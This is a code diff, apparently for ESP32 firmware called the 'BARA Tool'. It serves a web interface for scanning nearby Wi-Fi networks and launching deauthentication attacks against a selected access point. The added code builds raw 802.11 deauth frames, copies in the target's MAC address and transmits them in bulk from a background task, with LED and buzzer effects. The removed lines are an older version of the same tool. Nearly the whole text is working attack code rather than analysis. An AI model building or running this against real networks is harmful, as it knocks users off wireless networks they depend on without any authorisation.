+  JsonArray networks = doc.createNestedArray("networks");
+  
+  for (int i = 0; i < n; ++i) {
+    JsonObject network = networks.createNestedObject();
+    network["ssid"] = WiFi.SSID(i);
+    network["bssid"] = WiFi.BSSIDstr(i);
+    network["channel"] = WiFi.channel(i);
+    network["rssi"] = WiFi.RSSI(i);
+    network["encryption"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Protected";
+  }
+  
+  serializeJson(doc, networksJSON);
+  isScanning = false;
+  addLog("SCANNER", String(n) + " networks found");
+}
+
+// ==================== DEAUTH ATTACK ====================
+void launchDeauthAttack(String bssid, int channel) {
+  isAttacking = true;
+  attackProgress = 0;
+  
+  addLog("ATTACK", "Starting deauth attack on: " + bssid);
+  addLog("ATTACK", "Setting channel to: " + String(channel));
+  
+  // Set WiFi channel
+  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+  
+  // Deauth attack implementation
+  for(int i = 0; i < DEAUTH_PACKETS && isAttacking; i++) {
+    sendDeauthFrame(bssid);
+    attackProgress = (i * 100) / DEAUTH_PACKETS;
+    delay(10);
     
-    // Initialize LEDs
-    pinMode(LED_RED, OUTPUT);
-    pinMode(LED_GREEN, OUTPUT);
-    pinMode(LED_BLUE, OUTPUT);
-    pinMode(LED_WHITE, OUTPUT);
-    pinMode(BUZZER_PIN, OUTPUT);
-    
-    // Initialize SPIFFS
-    if (!SPIFFS.begin(true)) {
-        Serial.println("SPIFFS initialization failed!");
+    // Visual and audio effects
+    if(effectsEnabled) {
+      digitalWrite(LED_PIN, !digitalRead(LED_PIN));
+      if(i % 100 == 0) playAttackSound();
     }
-    
-    // Setup audio
-    setupAudio();
-    
-    // Visual startup sequence
-    visualEffect("startup");
-    
-    // Setup WiFi
-    setupWiFi();
-    
-    // Setup server routes
-    server.on("/", handleRoot);
-    server.on("/scan", handleScan);
-    server.on("/scanstatus", handleScanStatus);
-    server.on("/deauth", handleDeauth);
-    server.on("/deauthstatus", handleDeauthStatus);
-    server.on("/status", handleStatus);
-    server.on("/sound", handleSound);
-    
-    server.begin();
-    Serial.println("HTTP server started");
-    
-    // Final startup effect
-    playAudioEffect("startup");
-    visualEffect("ready");
+  }
+  
+  isAttacking = false;
+  attackProgress = 100;
+  addLog("ATTACK", "Deauth attack completed");
 }
 
-// ==================== MAIN LOOP ====================
-void loop() {
-    server.handleClient();
-    
-    if (deauthRunning) {
-        // Deauth attack logic here
-        unsigned long currentTime = millis();
-        if (currentTime - deauthStartTime > MAX_DEAUTH_TIME) {
-            stopDeauthAttack();
-        }
-    }
-    
-    updateLEDs();
-    delay(100);
+void sendDeauthFrame(String bssid) {
+  // Deauth frame structure
+  uint8_t deauthPacket[26] = {
+    0xc0, 0x00, 0x00, 0x00, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
+    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0x00, 0x00,
+    0x01, 0x00
+  };
+  
+  // Convert BSSID string to bytes
+  uint8_t targetMAC[6];
+  sscanf(bssid.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
+         &targetMAC[0], &targetMAC[1], &targetMAC[2], 
+         &targetMAC[3], &targetMAC[4], &targetMAC[5]);
+  
+  // Set destination MAC in packet
+  memcpy(&deauthPacket[4], targetMAC, 6);
+  memcpy(&deauthPacket[10], targetMAC, 6);
+  memcpy(&deauthPacket[16], targetMAC, 6);
+  
+  // Send packet
+  esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
 }
 
-// ==================== WIFI SETUP ====================
-void setupWiFi() {
-    WiFi.mode(WIFI_AP_STA);
-    
-    // Setup Access Point
-    WiFi.softAP(AP_SSID, AP_PASSWORD);
-    Serial.println("Access Point Started");
-    Serial.print("AP IP address: ");
-    Serial.println(WiFi.softAPIP());
-    
-    // Configure WiFi for monitoring
-    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
-    esp_wifi_init(&cfg);
-    esp_wifi_set_storage(WIFI_STORAGE_RAM);
-    esp_wifi_set_mode(WIFI_MODE_NULL);
-    esp_wifi_start();
+// ==================== AUDIO EFFECTS ====================
+void playAttackSound() {
+  for(int i = 0; i < 3; i++) {
+    digitalWrite(BUZZER_PIN, HIGH);
+    delay(50);
+    digitalWrite(BUZZER_PIN, LOW);
+    delay(50);
+  }
 }
 
-// ==================== WEB HANDLERS ====================
+void playScanSound() {
+  digitalWrite(BUZZER_PIN, HIGH);
+  delay(100);
+  digitalWrite(BUZZER_PIN, LOW);
+}
+
+// ==================== WEB SERVER HANDLERS ====================
 void handleRoot() {
-    server.send(200, "text/html", MAIN_PAGE);
+  server.send(200, "text/html", MAIN_PAGE);
 }
 
 void handleScan() {
-    scanRunning = true;
-    visualEffect("scan");
-    playAudioEffect("scan");
-    
-    // WiFi scan implementation
-    int scanResult = WiFi.scanNetworks(true, true);
-    
-    DynamicJsonDocument doc(4096);
-    doc["status"] = "scanning";
-    doc["networks_found"] = scanResult;
-    
-    String response;
-    serializeJson(doc, response);
-    server.send(200, "application/json", response);
-}
-
-void handleScanStatus() {
-    int networksFound = WiFi.scanComplete();
-    DynamicJsonDocument doc(4096);
-    JsonArray networks = doc.createNestedArray("networks");
-    
-    if (networksFound > 0) {
-        for (int i = 0; i < networksFound; ++i) {
-            JsonObject network = networks.createNestedObject();
-            network["ssid"] = WiFi.SSID(i);
-            network["bssid"] = WiFi.BSSIDstr(i);
-            network["rssi"] = WiFi.RSSI(i);
-            network["channel"] = WiFi.channel(i);
-            network["encryption"] = (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "Open" : "Encrypted";
-        }
-        WiFi.scanDelete();
-    }
-    
-    doc["scan_running"] = (networksFound == -1);
-    doc["networks_count"] = (networksFound > 0) ? networksFound : 0;
-    
-    String response;
-    serializeJson(doc, response);
-    server.send(200, "application/json", response);
+  if(isScanning) {
+    server.send(200, "application/json", "{\"status\":\"scanning\"}");
+    return;
+  }
+  
+  scanNetworks();
+  server.send(200, "application/json", networksJSON);
 }
 
 void handleDeauth() {
-    if (server.hasArg("start") && server.hasArg("bssid")) {
-        String bssid = server.arg("bssid");
-        startDeauthAttack(bssid);
-        
-        DynamicJsonDocument doc(512);
-        doc["success"] = true;
-        doc["message"] = "Deauth attack started";
-        
-        String response;
-        serializeJson(doc, response);
-        server.send(200, "application/json", response);
-    }
-    else if (server.hasArg("stop")) {
-        stopDeauthAttack();
-        
-        DynamicJsonDocument doc(512);
-        doc["success"] = true;
-        doc["message"] = "Deauth attack stopped";
-        
-        String response;
-        serializeJson(doc, response);
-        server.send(200, "application/json", response);
-    }
+  if(server.hasArg("plain")) {
+    String body = server.arg("plain");
+    DynamicJsonDocument doc(256);
+    deserializeJson(doc, body);
+    
+    String bssid = doc["bssid"];
+    int channel = doc["channel"];
+    
+    server.send(200, "application/json", "{\"status\":\"attack_started\"}");
+    
+    // Start attack in separate task
+    xTaskCreatePinnedToCore(
+      deauthTask,
+      "deauth_task",
+      4096,
+      new AttackParams{bssid, channel},
+      1,
+      NULL,
+      1
+    );
+  } else {
+    server.send(400, "application/json", "{\"error\":\"missing_parameters\"}");
+  }
 }
 
-void handleDeauthStatus() {
-    DynamicJsonDocument doc(512);
-    doc["deauth_running"] = deauthRunning;
-    doc["packets_sent"] = deauthPackets;
-    doc["packet_rate"] = deauthRunning ? random(50, 200) : 0;
-    doc["target_bssid"] = targetBSSID;
-    doc["target_ssid"] = targetSSID;
-    
-    String response;
-    serializeJson(doc, response);
-    server.send(200, "application/json", response);
+void handleStop() {
+  isAttacking = false;
+  isScanning = false;
+  server.send(200, "application/json", "{\"status\":\"stopped\"}");
+  addLog("SYSTEM", "All operations stopped");
 }
 
 void handleStatus() {
-    DynamicJsonDocument doc(512);
-    doc["wifi_strength"] = WiFi.RSSI();
-    doc["memory_usage"] = esp_get_free_heap_size() / 1024;
-    doc["uptime"] = millis() / 1000;
-    doc["ap_clients"] = WiFi.softAPgetStationNum();
-    
-    String response;
-    serializeJson(doc, response);
-    server.send(200, "application/json", response);
+  String status = "{";
+  status += "\"attacking\":" + String(isAttacking ? "true" : "false") + ",";
+  status += "\"scanning\":" + String(isScanning ? "true" : "false") + ",";
+  status += "\"progress\":" + String(attackProgress);
+  status += "}";
+  
+  server.send(200, "application/json", status);
 }
 
-void handleSound() {
-    if (server.hasArg("type")) {
-        playAudioEffect(server.arg("type"));
-    }
-    server.send(200, "text/plain", "OK");
+// ==================== TASK FUNCTIONS ====================
+struct AttackParams {
+  String bssid;
+  int channel;
+};
+
+void deauthTask(void *parameter) {
+  AttackParams* params = (AttackParams*)parameter;
+  launchDeauthAttack(params->bssid, params->channel);
+  delete params;
+  vTaskDelete(NULL);
 }
 
-// ==================== DEAUTH ATTACK FUNCTIONS ====================
-void startDeauthAttack(String bssid) {
-    deauthRunning = true;
-    deauthStartTime = millis();
-    deauthPackets = 0;
-    targetBSSID = bssid;
-    
-    visualEffect("deauth_start");
-    playAudioEffect("attack");
-    
-    Serial.println("Deauth attack started on: " + bssid);
+// ==================== LOGGING SYSTEM ====================
+void addLog(String system, String message) {
+  Serial.println("[" + system + "] " + message);
 }
 
-void stopDeauthAttack() {
-    deauthRunning = false;
-    visualEffect("deauth_stop");
-    playAudioEffect("stop");
-    
-    Serial.println("Deauth attack stopped");
-    Serial.print("Total packets sent: ");
-    Serial.println(deauthPackets);
+// ==================== SETUP & LOOP ====================
+void setup() {
+  Serial.begin(115200);
+  
+  // Initialize pins
+  pinMode(LED_PIN, OUTPUT);
+  pinMode(BUZZER_PIN, OUTPUT);
+  
+  // Startup sequence
+  for(int i = 0; i < 5; i++) {
+    digitalWrite(LED_PIN, HIGH);
+    delay(100);
+    digitalWrite(LED_PIN, LOW);
+    delay(100);
+  }
+  
+  // Create access point
+  WiFi.softAP(AP_SSID, AP_PASSWORD);
+  
+  addLog("SYSTEM", "BARA Access Point Started");
+  addLog("SYSTEM", "SSID: " + String(AP_SSID));
+  addLog("SYSTEM", "IP: " + WiFi.softAPIP().toString());
+  
+  // Setup web server routes
+  server.on("/", handleRoot);
+  server.on("/scan", handleScan);
+  server.on("/deauth", HTTP_POST, handleDeauth);
+  server.on("/stop", HTTP_POST, handleStop);
+  server.on("/status", handleStatus);
+  
+  server.begin();
+  addLog("SYSTEM", "Web server started");
+  addLog("SYSTEM", "BARA Tool Ready - Developed by Ahmed Nour Ahmed");
 }
 
-// ==================== AUDIO & VISUAL EFFECTS ====================
-void setupAudio() {
-    mySoftwareSerial.begin(9600, SERIAL_8N1, 16, 17);
-    
-    if (!myDFPlayer.begin(mySoftwareSerial)) {
-        Serial.println("DFPlayer initialization failed!");
-    } else {
-        Serial.println("DFPlayer initialized successfully");
-        myDFPlayer.volume(20); // Set volume (0-30)
-    }
-}
-
-void playAudioEffect(String type) {
-    if (type == "startup") {
-        // Play startup sound
-        tone(BUZZER_PIN, 1000, 200);
-        delay(200);
-        tone(BUZZER_PIN, 1500, 200);
-        delay(200);
-        tone(BUZZER_PIN, 2000, 200);
-    }
-    else if (type == "scan") {
-        tone(BUZZER_PIN, 800, 100);
-    }
-    else if (type == "attack") {
-        tone(BUZZER_PIN, 2000, 300);
-    }
-    else if (type == "stop") {
-        tone(BUZZER_PIN, 500, 200);
-    }
-    else if (type == "select") {
-        tone(BUZZER_PIN, 1200, 150);
-    }
-}
-
-void visualEffect(String type) {
-    if (type == "startup") {
-        for (int i = 0; i < 3; i++) {
-            digitalWrite(LED_RED, HIGH);
-            digitalWrite(LED_GREEN, LOW);
-            digitalWrite(LED_BLUE, LOW);
-            delay(200);
-            digitalWrite(LED_RED, LOW);
-            digitalWrite(LED_GREEN, HIGH);
-            digitalWrite(LED_BLUE, LOW);
-            delay(200);
-            digitalWrite(LED_RED, LOW);
-            digitalWrite(LED_GREEN, LOW);
-            digitalWrite(LED_BLUE, HIGH);
-            delay(200);
-        }
-    }
-    else if (type == "ready") {
-        digitalWrite(LED_GREEN, HIGH);
-        digitalWrite(LED_WHITE, HIGH);
-    }
-    else if (type == "scan") {
-        digitalWrite(LED_BLUE, HIGH);
-        delay(500);
-        digitalWrite(LED_BLUE, LOW);
-    }
-    else if (type == "deauth_start") {
-        digitalWrite(LED_RED, HIGH);
-    }
-    else if (type == "deauth_stop") {
-        digitalWrite(LED_RED, LOW);
-        digitalWrite(LED_GREEN, HIGH);
-    }
-}
-
-void updateLEDs() {
-    static unsigned long lastBlink = 0;
-    static bool ledState = false;
-    
-    if (millis() - lastBlink > 500) {
-        ledState = !ledState;
-        digitalWrite(LED_WHITE, ledState);
-        lastBlink = millis();
-    }
-    
-    if (deauthRunning) {
-        digitalWrite(LED_RED, (millis() % 200 < 100));
-    }
+void loop() {
+  server.handleClient();
+  
+  // Visual effects when active
+  if(isAttacking && effectsEnabled) {
+    digitalWrite(LED_PIN, millis() % 200 < 100);
+  }
+  
+  delay(10);
 }
